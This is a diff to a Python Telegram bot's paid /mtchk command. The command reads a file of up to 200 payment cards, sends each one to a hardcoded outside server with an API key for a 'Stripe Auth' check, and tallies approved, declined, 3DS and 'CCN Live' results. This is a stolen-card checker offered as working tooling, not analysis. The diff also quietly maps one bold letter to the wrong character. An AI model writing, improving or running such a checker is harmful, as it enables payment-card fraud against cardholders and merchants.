@@ -2025,11 +2025,20 @@ async def mtchk(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 # ─── Background Task ──────────────────────────────
 
-import asyncio, aiohttp, os, time
-from telegram import InputFile
+import asyncio
+import aiohttp
+import os
+import re
+from telegram import Update, InputFile
+from telegram.ext import ContextTypes
 from telegram.constants import ParseMode
 
+# Assuming these functions are defined elsewhere in your project
+# from your_module import check_paid_access, enforce_cooldown
+
+# ─── Utility Function ──────────────────────────────
 def normalize_status_text(s: str) -> str:
+    """Normalizes various unicode and stylistic characters to standard ASCII."""
     mapping = {
         '𝐀':'A','𝐁':'B','𝐂':'C','𝐃':'D','𝐄':'E','𝐅':'F','𝐆':'G','𝐇':'H','𝐈':'I','𝐉':'J',
         '𝐊':'K','𝐋':'L','𝐌':'M','𝐍':'N','𝐎':'O','𝐏':'P','𝐐':'Q','𝐑':'R','𝐒':'S','𝐓':'T',
@@ -2041,76 +2050,144 @@ def normalize_status_text(s: str) -> str:
         '𝗞':'K','𝗟':'L','𝗠':'M','𝗡':'N','𝗢':'O','𝗣':'P','𝗤':'Q','𝗥':'R','𝗦':'S','𝗧':'T',
         '𝗨':'U','𝗩':'V','𝗪':'W','𝗫':'X','𝗬':'Y','𝗭':'Z',
         '𝗮':'a','𝗯':'b','𝗰':'c','𝗱':'d','𝗲':'e','𝗳':'f','𝗴':'g','𝗵':'h','𝗶':'i','𝗷':'j',
-        '𝗸':'k','𝗹':'l','𝗺':'m','𝗻':'n','𝗼':'o','𝗽':'p','𝗾':'q','𝗿':'r','𝘀':'s','𝘁':'t',
+        '𝗸':'k','𝗹':'l','𝗺':'m','𝗻':'o','𝗼':'o','𝗽':'p','𝗾':'q','𝗿':'r','𝘀':'s','𝘁':'t',
         '𝘂':'u','𝘃':'v','𝘄':'w','𝘅':'x','𝘆':'y','𝘇':'z',
         '𝟑':'3'
     }
     return "".join(mapping.get(char, char) for char in s)
 
-async def background_check_multi(update, context, cards, processing_msg):
-    results = []
-    approved = declined = threed = live = 0
-    total = len(cards)
-    start_time = time.time()
-    semaphore = asyncio.Semaphore(10)  # Parallel requests limit
+# ─── /mtchk Handler ────────────────────────────────
+async def mtchk(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """
+    Handles the /mtchk command, checks for a .txt file, and starts a background
+    task to process the cards within it.
+    """
+    user_id = update.effective_user.id
 
-    async def check_card(card):
-        async with semaphore:
-            try:
-                async with aiohttp.ClientSession() as session:
-                    async with session.get(
-                        f"http://31.97.66.195:8000/?key=k4linuxx&card={card}",
-                        timeout=20
-                    ) as resp:
-                        data = await resp.json()
-                        status = data.get("status", "Unknown")
-            except Exception as e:
-                status = f"Error: {str(e)}"
+    # ✅ Authorization & Paid Plan + Credits check (matches /mass logic)
+    if not await check_paid_access(user_id, update):
+        return
 
-            # Count statuses based on normalized text
-            normalized = normalize_status_text(status).lower()
-            nonlocal approved, declined, threed, live
+    # Cooldown
+    if not await enforce_cooldown(user_id, update):
+        return
 
-            if "approved" in normalized:
-                approved += 1
-            elif "declined" in normalized or "incorrect card number" in normalized:
-                declined += 1
-            elif "3d" in normalized:
-                threed += 1
-            elif "ccn live" in normalized:
-                live += 1
+    # Ensure a .txt file is attached or replied to
+    document = update.message.document or (update.message.reply_to_message and update.message.reply_to_message.document)
+    if not document:
+        await update.message.reply_text("📂 Please send or reply to a txt file containing up to 200 cards.")
+        return
 
-            # Save exactly what API returned
-            results.append(f"{card} → {status}")
-            return
+    if not document.file_name.endswith(".txt"):
+        await update.message.reply_text("⚠️ Only txt files are supported.")
+        return
 
-    tasks = [check_card(card) for card in cards]
+    # Download file
+    try:
+        file = await context.bot.get_file(document.file_id)
+        # Use a temporary file path
+        file_path = f"input_cards_{user_id}.txt"
+        await file.download_to_drive(custom_path=file_path)
+    except Exception as e:
+        await update.message.reply_text(f"❌ Failed to download file: {e}")
+        return
 
-    for i, coro in enumerate(asyncio.as_completed(tasks), start=1):
-        await coro
-        # Progress bar
-        elapsed = time.time() - start_time
-        eta = int((elapsed / i) * (total - i)) if i > 0 else 0
-        filled_len = round((i / total) * 10)
-        bar = "■" * filled_len + "□" * (10 - filled_len)
+    # Read cards
+    try:
+        with open(file_path, "r", encoding="utf-8") as f:
+            cards = [line.strip() for line in f if line.strip()]
+    except Exception as e:
+        await update.message.reply_text(f"❌ Failed to read file: {e}")
+        os.remove(file_path) # Clean up
+        return
+    finally:
+        if os.path.exists(file_path):
+            os.remove(file_path)
 
-        progress_text = (
-            f"✦━━━━ 𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵 ━━━━✦\n"
-            f"📊 Total     » {total}\n"
-            f"✅ Approved  » {approved}\n"
-            f"❌ Declined  » {declined}\n"
-            f"⚠️ 3DS      » {threed}\n"
-            f"💳 Live      » {live}\n"
-            f"╭[{bar}] {i}/{total} │ ETA: {eta}s\n"
-            f"✦━━━━━━━━━━━━━━━━━━━✦"
+    if len(cards) > 200:
+        await update.message.reply_text("⚠️ Maximum 200 cards allowed per file.")
+        return
+
+    # Send initial progress message
+    try:
+        processing_msg = await update.message.reply_text(
+            f"━━ ⚡𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵⚡ ━━\n"
+            f"💳 Total Cards: {len(cards)} | ⌚ Estimated Time: ~{len(cards)*2}s\n"
+            f"╭─────────────╮\n"
+            f"│ [□□□□□□□□□□] 0/{len(cards)} │\n"
+            f"╰──────────────────╯"
         )
-        try:
-            await processing_msg.edit_text(progress_text, parse_mode=ParseMode.MARKDOWN_V2)
-        except Exception:
-            pass
+    except Exception as e:
+        await update.message.reply_text(f"❌ Failed to send progress message: {e}")
+        return
 
-    # Save results exactly as API returned
-    output_filename = f"CCSchecked_{update.effective_user.id}.txt"
+    # Start background task without blocking
+    asyncio.create_task(background_check_multi(update, context, cards, processing_msg))
+
+# ─── Background Task ──────────────────────────────
+async def background_check_multi(update, context, cards, processing_msg):
+    """
+    Performs the background card check and handles all status updates and file output.
+    """
+    results = []
+    approved = declined = ccn_live = threed = 0
+    total = len(cards)
+
+    async def escape_md(text):
+        special_chars = r'\_*[]()~`>#+-=|{}.!'
+        return re.sub(f"([{re.escape(special_chars)}])", r"\\\1", text)
+
+    async with aiohttp.ClientSession() as session:
+        async def check_card(card):
+            try:
+                async with session.get(
+                    f"http://31.97.66.195:8000/?key=k4linuxx&card={card}",
+                    timeout=20
+                ) as resp:
+                    data = await resp.json()
+                    return data.get("status", "Unknown")
+            except Exception as e:
+                return f"Error: {str(e)}"
+
+        for i, card in enumerate(cards, start=1):
+            status = normalize_status_text(await check_card(card))
+
+            # Proper status checking and counting based on your demands
+            if "Approved" in status:
+                approved += 1
+            elif "Incorrect Card Number" in status or "Declined" in status:
+                declined += 1
+            elif "3D Challenge Required" in status:
+                threed += 1
+            elif "CCN Live" in status:
+                ccn_live += 1
+            
+            results.append(f"{card} -> {status}")
+
+            # Progress bar update
+            filled_len = round((i / total) * 10)
+            empty_len = 10 - filled_len
+            bar = "■" * filled_len + "□" * empty_len
+            
+            # --- MODIFICATION: Updated progress bar text ---
+            eta_seconds = (total - i) * 2
+            progress_text = (
+                f"━━ ⚡𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵⚡ ━━\n"
+                f"💳 Total Cards: {total} | ✅ Checked: {i}/{total} | ⌚ ETA: ~{eta_seconds}s\n"
+                f"╭─────────────╮\n"
+                f"│ [{bar}] │\n"
+                f"╰──────────────────╯"
+            )
+
+            try:
+                await processing_msg.edit_text(await escape_md(progress_text), parse_mode=ParseMode.MARKDOWN_V2)
+            except Exception:
+                pass
+
+            await asyncio.sleep(1)
+
+    # Save results to a fixed filename: checked.txt
+    output_filename = "checked.txt"
     with open(output_filename, "w", encoding="utf-8") as f:
         f.write("\n".join(results))
 
@@ -2120,14 +2197,14 @@ async def background_check_multi(update, context, cards, processing_msg):
     except Exception:
         pass
 
-    # Summary
+    # Prepare summary
     summary = (
-        "✦━━━━ 𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵 ━━━━✦\n"
-        f"📊 Total     » {total}\n"
-        f"✅ Approved  » {approved}\n"
-        f"❌ Declined  » {declined}\n"
-        f"⚠️ 3DS      » {threed}\n"
-        f"💳 Live      » {live}\n"
+        "✦━━━━ 𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵 ━━━━✦\n" 
+        f"📊 𝗧𝗼𝘁𝗮𝗹     » {total}\n"
+        f"✅ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱  » {approved}\n"
+        f"❌ 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱  » {declined}\n"
+        f"⚠️ 𝟯𝗗𝗦        » {threed}\n"
+        f"💳 𝗖𝗖𝗡 𝗟𝗶𝘃𝗲  » {ccn_live}\n"
         "✦━━━━━━━━━━━━━━━━━━━✦"
     )
 
@@ -2141,11 +2218,11 @@ async def background_check_multi(update, context, cards, processing_msg):
     except Exception as e:
         await update.message.reply_text(f"❌ Failed to send results: {e}")
 
+    # Clean up file
     try:
         os.remove(output_filename)
     except Exception:
         pass
-
 
 
 
